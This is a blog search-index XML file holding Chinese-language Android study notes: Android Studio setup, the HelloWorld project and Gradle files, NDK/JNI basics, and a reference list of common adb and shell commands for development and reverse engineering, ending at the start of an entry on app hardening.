<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Android-day1</title>
    <url>/2020/05/25/Android/Android-day1/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>因linux下的前景较窄，所以想了解下android下的一些内容，准备了好久，今天就正式吧。目前第一本书：《第一行代码:Android》。</p>
<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="Android系统架构"><a href="#Android系统架构" class="headerlink" title="Android系统架构"></a>Android系统架构</h2><p>Linux内核层</p>
<p>系统运行库层</p>
<p>应用框架层</p>
<p>应用层</p>
<h2 id="Android应用开发特色"><a href="#Android应用开发特色" class="headerlink" title="Android应用开发特色"></a>Android应用开发特色</h2><h5 id="四大组件"><a href="#四大组件" class="headerlink" title="四大组件"></a>四大组件</h5><p>活动（Activity）、服务（Service）、广播接收器（Broadcast Receiver）、内容提供器（Content Provider）</p>
<h5 id="丰富的系统控件"><a href="#丰富的系统控件" class="headerlink" title="丰富的系统控件"></a>丰富的系统控件</h5><h5 id="SQLite数据库"><a href="#SQLite数据库" class="headerlink" title="SQLite数据库"></a>SQLite数据库</h5><h5 id="强大的多媒体"><a href="#强大的多媒体" class="headerlink" title="强大的多媒体"></a>强大的多媒体</h5><h5 id="地理位置定位"><a href="#地理位置定位" class="headerlink" title="地理位置定位"></a>地理位置定位</h5><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>首先下载Android Studio：<a href="https://developer.android.google.cn/studio" target="_blank" rel="noopener">https://developer.android.google.cn/studio</a></p>
<p>安装的话直接跟着走就可以了，总的搭建过程还是比较简单的。</p>
<p>其中配置的时候会选择custom（自定义配置）还是standard（默认配置），看心情选吧。。</p>
<h2 id="第一个Android项目"><a href="#第一个Android项目" class="headerlink" title="第一个Android项目"></a>第一个Android项目</h2><h3 id="创建HelloWorld项目"><a href="#创建HelloWorld项目" class="headerlink" title="创建HelloWorld项目"></a>创建HelloWorld项目</h3><p>首先打开界面：</p>
<p><img src="./day1/1.jpg" alt=""></p>
<p>点击start a new Android Studio project，然后开始选择模板。</p>
<p><img src="./day1/2.jpg" alt=""></p>
<p>这里直接选择Empty Activity，并做如下配置：</p>
<p><img src="./day1/3.jpg" alt=""></p>
<p>点击Finish，等待一段时间后项目便创建成功了。</p>
<h3 id="启动模拟器"><a href="#启动模拟器" class="headerlink" title="启动模拟器"></a>启动模拟器</h3><p>点击右上角的图标：</p>
<p><img src="./day1/4.jpg" alt=""></p>
<p>默认已经有了Nexus 5X这台设备模拟器了，然后点击Actions栏最左边的三角形按钮即可启动（因为我是amd的cpu，安装不了hxam，armeabi-v7a的镜像也比较慢，所以用bluestacks来代替）。</p>
<h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>点击这个锤子</p>
<p><img src="./day1/5.png" alt=""></p>
<p>等待编译完成后，就可以在项目下的app\build\outputs\apk\debug中找到编译好的apk。</p>
<h3 id="安装运行"><a href="#安装运行" class="headerlink" title="安装运行"></a>安装运行</h3><p>直接将apk文件拖到bluestacks中，点击图标启动即可：</p>
<p><img src="./day1/6.jpg" alt=""></p>
<h2 id="分析HelloWorld项目"><a href="#分析HelloWorld项目" class="headerlink" title="分析HelloWorld项目"></a>分析HelloWorld项目</h2><p>在左侧资源端口可以看到HelloWorld项目，点击箭头打开可以看到如下：</p>
<p><img src="./day1/7.jpg" alt=""></p>
<h3 id="目录分析"><a href="#目录分析" class="headerlink" title="目录分析"></a>目录分析</h3><h4 id="一级目录"><a href="#一级目录" class="headerlink" title="一级目录"></a>一级目录</h4><h5 id="gradle和-idea"><a href="#gradle和-idea" class="headerlink" title=".gradle和.idea"></a>.gradle和.idea</h5><p>这两个目录下放置的都是Android Studio自动生成的一些文件。</p>
<h5 id="app"><a href="#app" class="headerlink" title="app"></a>app</h5><p>项目中的代码、资源等内容几乎都是放置在这个目录下的。</p>
<h5 id="build"><a href="#build" class="headerlink" title="build"></a>build</h5><p>主要包含了一些在编译时自动生成的文件。（本地没有，但书上有说，也放进来以备用）</p>
<h5 id="gradle"><a href="#gradle" class="headerlink" title="gradle"></a>gradle</h5><p>这个目录下包含了gradle wrapper的配置文件。Android Studio默认没有gradle wrapper方式，如需要打开，可以点击File -&gt; Settings -&gt; Build, Execution, Deployment -&gt; Gradle进行配置。</p>
<h5 id="gitignore"><a href="#gitignore" class="headerlink" title=".gitignore"></a>.gitignore</h5><p>这个文件是用来将指定的目录或文件排除在版本控制之外的。</p>
<h5 id="build-gradle"><a href="#build-gradle" class="headerlink" title="build.gradle"></a>build.gradle</h5><p>这是项目全局的gradle构建脚本。</p>
<h5 id="gradle-properties"><a href="#gradle-properties" class="headerlink" title="gradle.properties"></a>gradle.properties</h5><p>这个文件是全局的gradle配置文件。在这里配置的属性会影响到项目中所有的gradle编译脚本。</p>
<h5 id="gradlew和gradlew-bat"><a href="#gradlew和gradlew-bat" class="headerlink" title="gradlew和gradlew.bat"></a>gradlew和gradlew.bat</h5><p>这两个文件是用来在命令行界面中执行gradle命令的，其中gradlew是在Linux或Max系统中使用，gradlew.bat是在Windows系统中使用。</p>
<h5 id="HelloWorld-iml"><a href="#HelloWorld-iml" class="headerlink" title="HelloWorld.iml"></a>HelloWorld.iml</h5><p>iml文件是所有IntelliJ IDEA项目都会自动生成的文件，用于标识这是一个IntelliJ IDEA项目。</p>
<h5 id="local-properties"><a href="#local-properties" class="headerlink" title="local.properties"></a>local.properties</h5><p>这个文件用于指定本机中的Android SDK路径。</p>
<h5 id="settings-gradle"><a href="#settings-gradle" class="headerlink" title="settings.gradle"></a>settings.gradle</h5><p>这个文件用于指定项目中所有引入的模块。</p>
<h4 id="app目录"><a href="#app目录" class="headerlink" title="app目录"></a>app目录</h4><p><img src="./day1/8.jpg" alt=""></p>
<h5 id="build-1"><a href="#build-1" class="headerlink" title="build"></a>build</h5><p>与外层的build目录类似。</p>
<h5 id="libs"><a href="#libs" class="headerlink" title="libs"></a>libs</h5><p>如果项目中使用了第三方jar包，就需要把这些jar包都放在libs目录下，放在这个目录下的jar包都会被自动添加到构建路径里去。</p>
<h5 id="androidTest"><a href="#androidTest" class="headerlink" title="androidTest"></a>androidTest</h5><p>此处是用来编写Android Test测试用例的，可以对项目进行一些自动化测试。</p>
<h5 id="java"><a href="#java" class="headerlink" title="java"></a>java</h5><p>用来方式所有java代码的地方。</p>
<h5 id="res"><a href="#res" class="headerlink" title="res"></a>res</h5><p>项目中使用到的所有图片、布局、字符串等资源都要存放在这个目录下。图片放在drawable目录下，布局放在layout目录下，字符串放在values目录下。</p>
<h5 id="AndroidManifest-xml"><a href="#AndroidManifest-xml" class="headerlink" title="AndroidManifest.xml"></a>AndroidManifest.xml</h5><p>这是整个Android项目的配置文件，程序中定义的所有四大组件都需要在这个文件里注册，另外还可以在这个文件中给应用程序添加权限声明。</p>
<h5 id="test"><a href="#test" class="headerlink" title="test"></a>test</h5><p>此处是用来编写Unit Test测试用例的，是对项目进行自动化测试的另一种方式。</p>
<h5 id="gitignore-1"><a href="#gitignore-1" class="headerlink" title=".gitignore"></a>.gitignore</h5><p>这个文件用于将app模块内的指定目录或文件排除在版本控制之外，作用和外层的.gitignore类似。</p>
<h5 id="app-iml"><a href="#app-iml" class="headerlink" title="app.iml"></a>app.iml</h5><p>IntelliJ IDEA项目自动生成的文件。</p>
<h5 id="build-gradle-1"><a href="#build-gradle-1" class="headerlink" title="build.gradle"></a>build.gradle</h5><p>这是app模块的gradle构建脚本。</p>
<h5 id="proguard-rules-pro"><a href="#proguard-rules-pro" class="headerlink" title="proguard-rules.pro"></a>proguard-rules.pro</h5><p>这个文件用于指定项目代码的混淆规则。</p>
<h3 id="项目运行分析"><a href="#项目运行分析" class="headerlink" title="项目运行分析"></a>项目运行分析</h3><p>首先是打开AndroidManifest.xml找到如下代码：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">".MainActivity"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.MAIN"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.LAUNCHER"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这段代码表示对MainActivity这个活动进行注册（没有在AndroidManifest.xml中进行注册的活动是不能使用的）。</p>
<p>intent-filter里面， <code>&lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;</code>表示这个activity是主入口，即启动程序时首先运行的就是这个活动；<code>&lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;</code>表示这个activity种类，要加到LAUNCHER程序列表里面。</p>
<p>然后再看下MainActivity这个活动的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到MainActivity是继承自AppCompatActivity的，这是一种向下兼容的Activity，可以将Activity在各个系统版本中增加的特性和功能最低兼容到Android 2.1系统。</p>
<p>然后是onCreate()方法，这个方法是一个活动被创建时必定要执行的方法。</p>
<p>接着调用了setContentView()方法，这个方法给当前的活动引入了一个activity_main布局，可以在res/layout目录下找到它。</p>
<p>打开并切换到代码视图，代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;androidx.constraintlayout.widget.ConstraintLayout xmlns:android&#x3D;&quot;http:&#x2F;&#x2F;schemas.android.com&#x2F;apk&#x2F;res&#x2F;android&quot;</span><br><span class="line">    xmlns:app&#x3D;&quot;http:&#x2F;&#x2F;schemas.android.com&#x2F;apk&#x2F;res-auto&quot;</span><br><span class="line">    xmlns:tools&#x3D;&quot;http:&#x2F;&#x2F;schemas.android.com&#x2F;tools&quot;</span><br><span class="line">    android:layout_width&#x3D;&quot;match_parent&quot;</span><br><span class="line">    android:layout_height&#x3D;&quot;match_parent&quot;</span><br><span class="line">    tools:context&#x3D;&quot;.MainActivity&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;TextView</span><br><span class="line">        android:layout_width&#x3D;&quot;wrap_content&quot;</span><br><span class="line">        android:layout_height&#x3D;&quot;wrap_content&quot;</span><br><span class="line">        android:text&#x3D;&quot;Hello World!&quot;</span><br><span class="line">        app:layout_constraintBottom_toBottomOf&#x3D;&quot;parent&quot;</span><br><span class="line">        app:layout_constraintLeft_toLeftOf&#x3D;&quot;parent&quot;</span><br><span class="line">        app:layout_constraintRight_toRightOf&#x3D;&quot;parent&quot;</span><br><span class="line">        app:layout_constraintTop_toTopOf&#x3D;&quot;parent&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;androidx.constraintlayout.widget.ConstraintLayout&gt;</span><br></pre></td></tr></table></figure>

<p>其中TextView是Android系统提供的一个控件，用于在布局中显示文字。可以看到<code>android:text=&quot;Hello World!&quot;</code>这句代码的定义，也就是我们上面屏幕中所显示的<code>Hello World!</code>。</p>
<h3 id="详细项目中的资源"><a href="#详细项目中的资源" class="headerlink" title="详细项目中的资源"></a>详细项目中的资源</h3><p>res目录下，所有以drawable开头的文件夹都是用来放图片的，所有以mipmap开头的文件夹都是用来放应用图标的，所有以values开头的文件夹都是用来放字符串、样式、颜色等配置的，layout文件夹是用来放布局文件的。之所以有那么多相同开头的文件夹，主要是为了让程序能更好的兼容各种设备。</p>
<h4 id="使用资源"><a href="#使用资源" class="headerlink" title="使用资源"></a>使用资源</h4><p>打开res/value/strings.xml，内容如下所示：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">"app_name"</span>&gt;</span>HelloWorld<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>有以下两种方式来使用它：</p>
<ul>
<li>在代码中通过R.string.app_name引用</li>
<li>在xml中通过@string/app_name引用</li>
</ul>
<p>其中tring可以替换成drawable、mipmap、layout之类的内容。</p>
<h4 id="详解build-gradle文件"><a href="#详解build-gradle文件" class="headerlink" title="详解build.gradle文件"></a>详解build.gradle文件</h4><p>首先看下外层的build.gradle文件：</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Top-level build file where you can add configuration options common to all sub-projects/modules.</span></span><br><span class="line"><span class="keyword">buildscript</span> &#123;</span><br><span class="line">    <span class="keyword">repositories</span> &#123;</span><br><span class="line">        google()</span><br><span class="line">        jcenter()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">dependencies</span> &#123;</span><br><span class="line">        <span class="keyword">classpath</span> <span class="string">'com.android.tools.build:gradle:3.6.3'</span></span><br><span class="line">        <span class="comment">// <span class="doctag">NOTE:</span> Do not place your application dependencies here; they belong</span></span><br><span class="line">        <span class="comment">// in the individual module build.gradle files</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">allprojects</span> &#123;</span><br><span class="line">    <span class="keyword">repositories</span> &#123;</span><br><span class="line">        google()</span><br><span class="line">        jcenter()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">task</span> clean(type: <span class="keyword">Delete</span>) &#123;</span><br><span class="line">    <span class="keyword">delete</span> rootProject.buildDir</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先，两处repositories的闭包中都声明了google()和jcenter()配置，声明了这两行后，就可以在项目中轻松引用任何jcenter和google上的开源项目。</p>
<p>dependencies闭包中使用了classpath声明一个gradle插件。</p>
<p>接着分析下app目录下的build.gradle文件：</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">apply plugin: <span class="string">'com.android.application'</span></span><br><span class="line"></span><br><span class="line">android &#123;</span><br><span class="line">    compileSdkVersion <span class="number">29</span></span><br><span class="line">    buildToolsVersion <span class="string">"29.0.3"</span></span><br><span class="line"></span><br><span class="line">    defaultConfig &#123;</span><br><span class="line">        applicationId <span class="string">"com.example.helloworld"</span></span><br><span class="line">        minSdkVersion <span class="number">16</span></span><br><span class="line">        targetSdkVersion <span class="number">29</span></span><br><span class="line">        versionCode <span class="number">1</span></span><br><span class="line">        versionName <span class="string">"1.0"</span></span><br><span class="line"></span><br><span class="line">        testInstrumentationRunner <span class="string">"androidx.test.runner.AndroidJUnitRunner"</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    buildTypes &#123;</span><br><span class="line">        release &#123;</span><br><span class="line">            minifyEnabled <span class="keyword">false</span></span><br><span class="line">            proguardFiles getDefaultProguardFile(<span class="string">'proguard-android-optimize.txt'</span>), <span class="string">'proguard-rules.pro'</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">dependencies</span> &#123;</span><br><span class="line">    implementation <span class="keyword">fileTree</span>(dir: <span class="string">'libs'</span>, <span class="keyword">include</span>: [<span class="string">'*.jar'</span>])</span><br><span class="line"></span><br><span class="line">    implementation <span class="string">'androidx.appcompat:appcompat:1.0.2'</span></span><br><span class="line">    implementation <span class="string">'androidx.constraintlayout:constraintlayout:1.1.3'</span></span><br><span class="line">    testImplementation <span class="string">'junit:junit:4.12'</span></span><br><span class="line">    androidTestImplementation <span class="string">'androidx.test.ext:junit:1.1.1'</span></span><br><span class="line">    androidTestImplementation <span class="string">'androidx.test.espresso:espresso-core:3.2.0'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第一行应用了一个插件，一般有两种值可选：com.android.application表示这是一个应用程序插件，com.android.library表示这是一个库模块。</p>
<p>接下来是android闭包，这个闭包中我们可以配置项目构建的各种属性，其中compileSdkVersion用于指定项目构建工具的版本。</p>
<p>同时，android闭包中又嵌套了一个defaultConfig闭包，defaultConfig闭包中可以对项目的更多细节进行配置。其中applicationId用于指定项目的包名，minSdkVersion用于指定项目最低兼容的Android系统版本。targetSdkVersion指定的值表示在该项目上已做过了充分的测试，系统将会为你的应用程序启动一些最新的功能和特性。versionCode用于指定项目的版本号。versionName用于指定项目的版本名。</p>
<p>然后再分析下buildTypes闭包。buildTypes闭包中用于指定生成安装文件的相关配置，其中的debug闭包（这里没有）用于指定生成测试版安装文件的配置，release闭包用于指定生成正式版安装文件的配置。minifyEnabled用于指定是否对项目的代码进行混淆。proguardFiles用于指定混淆时使用的规则文件，其中proguard-android.txt是所有项目通用的混淆规则，第二个proguard-rules.pro是当前项目的根目录下的，可以编写当前项目特有的混淆规则。</p>
<p>然后是dependencies闭包。这个闭包指定用来当前项目所有的依赖关系。Android Studio项目一共有3中依赖方式：</p>
<ul>
<li>本地依赖：可以对本地的jar包或目录添加依赖关系。</li>
<li>库依赖：可以对项目中的库模块添加依赖关系。</li>
<li>远程依赖：可以对jcenter库和google库上的开源项目添加依赖关系。</li>
</ul>
<p>dependencies闭包中的第一行implementation fileTree就是一个本地依赖声明，它表示将libs目录下所有.jar后缀的文件都添加到项目的构建路径当中。</p>
<p>第二行implementation则是远程依赖声明，<code>androidx.appcompat:appcompat:1.0.2</code>和<code>androidx.constraintlayout:constraintlayout:1.1.3</code>是一个标准的远程依赖库格式，androidx.constraintlayout是域名部分，constraintlayout是组名，1.1.3是版本号。加上这句声明后，Gradle在构建项目时会首先检查下本地是否已经有这个库的缓存，如果没有的话则会去自动联网下载，然后再添加到项目的构建路径当中。</p>
<p>testImplementation用于声明测试用例库，这个暂时用不到。</p>
<h2 id="日志工具"><a href="#日志工具" class="headerlink" title="日志工具"></a>日志工具</h2><h3 id="Log"><a href="#Log" class="headerlink" title="Log"></a>Log</h3><p>android的日志工具是Log，这个类中提供了如下5个方法供我们打印日志：</p>
<ul>
<li>log.v()用于打印最琐碎，意义最小的日志信息。</li>
<li>log.d()用于打印调试信息。</li>
<li>log.i()用于打印比较重要的数据。</li>
<li>log.w()用于打印一些警告信息。</li>
<li>log.e()用于打印程序中的错误信息。</li>
</ul>
<h5 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h5><p>在MainActivity的onCreate()方法中添加一行打印日志语句：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Log.d(<span class="string">"MainActivity"</span>,<span class="string">"onCreate execute"</span>);</span><br></pre></td></tr></table></figure>

<p>其中第一个参数是tag，一般传入当前类名即可，主要用于对打印信息进行过滤；第二个参数是msg，即想要打印的具体的内容：</p>
<p><img src="./day1/9.jpg" alt=""></p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>Android-day10</title>
    <url>/2020/06/05/Android/Android-day10/</url>
    <content><![CDATA[<h1 id="Android中的NDK开发"><a href="#Android中的NDK开发" class="headerlink" title="Android中的NDK开发"></a>Android中的NDK开发</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>新建一个，这里命名为NDKbase吧</p>
<p>然后在java目录同层新建jni目录：new-&gt;folder-&gt;jni folder。</p>
<p>右键点击app目录，选择Open mode Setting。然后配置其中的SDK Location，使其指向ndk开发环境。</p>
<p>配置app/build.gradle中的ndx选项：</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">defaultConfig &#123;</span><br><span class="line">    applicationId <span class="string">"com.example.ndkbase"</span></span><br><span class="line">    minSdkVersion <span class="number">16</span></span><br><span class="line">    targetSdkVersion <span class="number">29</span></span><br><span class="line">    versionCode <span class="number">1</span></span><br><span class="line">    versionName <span class="string">"1.0"</span></span><br><span class="line">    ndk&#123;</span><br><span class="line">        moduleName <span class="string">"encrypto"</span></span><br><span class="line">        abiFilters <span class="string">"armeabi"</span>, <span class="string">"armeabi-v7a"</span>, <span class="string">"x86"</span></span><br><span class="line">        ldLibs <span class="string">"logs"</span></span><br><span class="line">    &#125;</span><br><span class="line">    testInstrumentationRunner <span class="string">"androidx.test.runner.AndroidJUnitRunner"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中moduleName为so文件名称，abiFilters为支持的体系结构，<code>ldLibs &quot;logs&quot;</code>为增加log的lib库。</p>
<p>然后再build目录下生成指定的so文件，拷贝到项目的libs目录下即可。</p>
<h2 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h2><p>参考：<a href="https://blog.csdn.net/zhuowalun8427/article/details/105970017/" target="_blank" rel="noopener">https://blog.csdn.net/zhuowalun8427/article/details/105970017/</a></p>
<p>因为是java14的，所以命令改成：</p>
<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">javac -h jni -classpath H:\code\Android\nativelib\app\build\intermediates\javac\debug\classes java/com/example/native_lib/myjni.java</span><br></pre></td></tr></table></figure>

<h2 id="JNIEnv类型和jobject类型"><a href="#JNIEnv类型和jobject类型" class="headerlink" title="JNIEnv类型和jobject类型"></a>JNIEnv类型和jobject类型</h2><h3 id="JNIEnv类型"><a href="#JNIEnv类型" class="headerlink" title="JNIEnv类型"></a>JNIEnv类型</h3><p>JNIEnv类型代表了Java环境，通过JNIEnv* 指针就可以对Java端的代码进行操作。</p>
<p>JNIEnv类型有很多函数可用：</p>
<p><code>NewObject</code>：创建Java类中的对象。</p>
<p><code>NewString</code>：创建Java类中的String对象。</p>
<p><code>New&lt;Type&gt;Array</code>创建类型为Type的数组对象。</p>
<p><code>Get&lt;Type&gt;Field</code>获取类型为Type的字段。</p>
<p><code>Set&lt;Type&gt;Field</code>设置类型为Type的字段的值。</p>
<p><code>GetStatic&lt;Type&gt;Field</code>获取类型为Type的static的字段。</p>
<p><code>SetStatic&lt;Type&gt;Field</code>设置类型为Type的static的字段的值。</p>
<p><code>Call&lt;Type&gt;Method</code>调用返回类型为Type的方法。</p>
<p><code>CallStatic&lt;Type&gt;Method</code>调用返回类型为Type的static方法。</p>
<h3 id="jobject参数obj"><a href="#jobject参数obj" class="headerlink" title="jobject参数obj"></a>jobject参数obj</h3><p>如果native方法不是static，obj就代表native方法的类实例。</p>
<p>如果native方法是static，obj就代表native方法的类的class对象实例。</p>
<h3 id="Java类型和native中的类型映射关系"><a href="#Java类型和native中的类型映射关系" class="headerlink" title="Java类型和native中的类型映射关系"></a>Java类型和native中的类型映射关系</h3><p>具体可以查看jni.h文件</p>
<h3 id="jclass类型"><a href="#jclass类型" class="headerlink" title="jclass类型"></a>jclass类型</h3><p>jclass类型用于表示Java中的Class类。</p>
<p>JNIEnv中有以下几个函数可以取得jclass：</p>
<p>jclass FindClass(const char* clsName)通过类名（类的全名，包名是用/分割的）来获取jclass。</p>
<p>jclass GetObjectClass(jobject obj)通过对象实例来获取jclass。</p>
<p>jclass GetSuperClass(jclass obj)通过jclass获取其父类的jclass对象。</p>
<h3 id="native中访问Java层代码"><a href="#native中访问Java层代码" class="headerlink" title="native中访问Java层代码"></a>native中访问Java层代码</h3><p>为了在C/C++中表示属性和方法，JNI在jni.h头文件中定义了jfieldId、jmethodID类型来分别代表Java的属性和方法。在访问时，需要先获取ID，然后才能再本地代码中进行操作或调用。</p>
<p>JNIEnv的如下方法可以获得jfieldId和jmethodID：</p>
<ul>
<li>GetFiledID/GetMethodID</li>
<li>GetStaticFieldID/GetStaticMethodID</li>
</ul>
<p>以GetFiledID方法为例，其定义如下：</p>
<p>GetFiledID(jclass clazz, const char* name, const char* sign)</p>
<p>其中的三个参数：</p>
<p>clazz：这个方法依赖的类对象的class对象。</p>
<p>name：这个字段的名字。</p>
<p>sign：这个字段的签名。</p>
<h3 id="JNIEnv类型中方法的使用"><a href="#JNIEnv类型中方法的使用" class="headerlink" title="JNIEnv类型中方法的使用"></a>JNIEnv类型中方法的使用</h3><p>略过</p>
<h1 id="Android中开发与逆向常用命令总结"><a href="#Android中开发与逆向常用命令总结" class="headerlink" title="Android中开发与逆向常用命令总结"></a>Android中开发与逆向常用命令总结</h1><h2 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h2><p>cat</p>
<p>echo</p>
<p>touch</p>
<h2 id="非shell命令"><a href="#非shell命令" class="headerlink" title="非shell命令"></a>非shell命令</h2><p>需要提前用adb shell命令运行的命令叫做shell命令，直接用adb shell运行的命令叫做非shell命令。</p>
<ul>
<li>adb shell dumpsys activity top    可以查看当前应用的activity信息。</li>
<li>adb shell dumpsys    同上，但会打印四大组件的信息。</li>
<li>adb shell dumpsys package [pkgname]    可以查询指定包名应用的详细信息（相当于应用的AndroidManifest.xml中的内容）。<br>adb shell dumpsys meminfo [pname/pid]    可以查看指定进程名或进程id的内存信息。</li>
<li>adb shell dumpsys dbinfo [packagename]    可以查看指定包名应用的数据库存储信息（包括存储的SQL语句）。</li>
<li>adb install [apk]    安装指定应用宝apk文件，-r参数相当于升级。</li>
<li>adb uninstall [packagename]    卸载应用。</li>
<li>adb pull [设备目录文件] [本地目录]    下载设备上的文件到本地。</li>
<li>adb pull [本地目录] [设备目录文件]    上传本地文件到目录。</li>
<li>adb shell screencap -p [路径]    截屏。</li>
<li>adb shell screenrecord [路径]    录屏。</li>
<li>adb shell input text [content]    输入文本内容。</li>
<li>adb forward [远程端协议:端口号] [设备端协议:端口号]    设备的端口转发。</li>
<li>adb jdwp    查看设备中可以被调试的应用的进程号。</li>
<li>adb logcat    查看当前日志信息。</li>
</ul>
<h2 id="shell命令"><a href="#shell命令" class="headerlink" title="shell命令"></a>shell命令</h2><ul>
<li>run-as [packagename]    可以在非root设备中查看指定debug模式的包名应用沙盒数据。</li>
<li>ps    查看进程信息。</li>
<li>pm clear [packagename]    清空指定包名应用的数据</li>
<li>pm install [apk]    安装apk文件。</li>
<li>pm uninstall [packagename]    卸载应用。</li>
<li>am start -n [packagename]/[packagename].[Activity]    启动一个指定活动。debug方式需加-D参数。</li>
<li>am startservice -n [packagename]/[packagename].[service]    启动一个服务。</li>
<li>am broadcast -a [广播动作]    发送一个广播。</li>
<li>netcfg    查看设备的ip地址。</li>
<li>netstat    查看设备的端口号信息。</li>
<li>app_process [运行代码目录] [运行主类]    运行java代码。</li>
<li>dalvikvm -cp [dex文件] [运行主类]    运行一个dex文件。</li>
<li>top    查看当前应用的CPU消耗信息。</li>
<li>getprop [属性值名称]    查看系统属性值</li>
</ul>
<h2 id="操作apk命令"><a href="#操作apk命令" class="headerlink" title="操作apk命令"></a>操作apk命令</h2><ul>
<li>aapt dump xmltree [apk包名] [需要查看的资源文件xml]    查看apk中的信息以及编辑apk程序包。</li>
<li>dexdump [dex文件路径]    查看dex文件的详细信息。</li>
</ul>
<h2 id="进程命令"><a href="#进程命令" class="headerlink" title="进程命令"></a>进程命令</h2><h4 id="查看当前进程的内存加载情况"><a href="#查看当前进程的内存加载情况" class="headerlink" title="查看当前进程的内存加载情况"></a>查看当前进程的内存加载情况</h4><p>cat /proc/[pid]/maps</p>
<h4 id="查看进程的状态信息"><a href="#查看进程的状态信息" class="headerlink" title="查看进程的状态信息"></a>查看进程的状态信息</h4><p>cat /proc/[pid]/status</p>
<h4 id="查看当前应用使用的端口号信息"><a href="#查看当前应用使用的端口号信息" class="headerlink" title="查看当前应用使用的端口号信息"></a>查看当前应用使用的端口号信息</h4><p>cat /proc/[pid]/net/[四选一：tcp/tcp6/udp/udp6]</p>
<h1 id="so文件格式解析"><a href="#so文件格式解析" class="headerlink" title="so文件格式解析"></a>so文件格式解析</h1><p>略，参考：《Linux二进制分析》 | nuoye  <a href="https://nuoye-blog.github.io/2020/05/09/%E7%AC%94%E8%AE%B0/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/">https://nuoye-blog.github.io/2020/05/09/%E7%AC%94%E8%AE%B0/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/</a></p>
<p>具体可直接看书或用命令<code>man 5 elf</code>了解。</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>Android-day13</title>
    <url>/2020/06/09/Android/Android-day13/</url>
    <content><![CDATA[<h1 id="Android应用加固原理"><a href="#Android应用加固原理" class="headerlink" title="Android应用加固原理"></a>Android应用加固原理</h1><h2 id="加固原理解析"><a href="#加固原理解析" class="headerlink" title="加固原理解析"></a>加固原理解析</h2><p>加固的过程需要三个对象：</p>
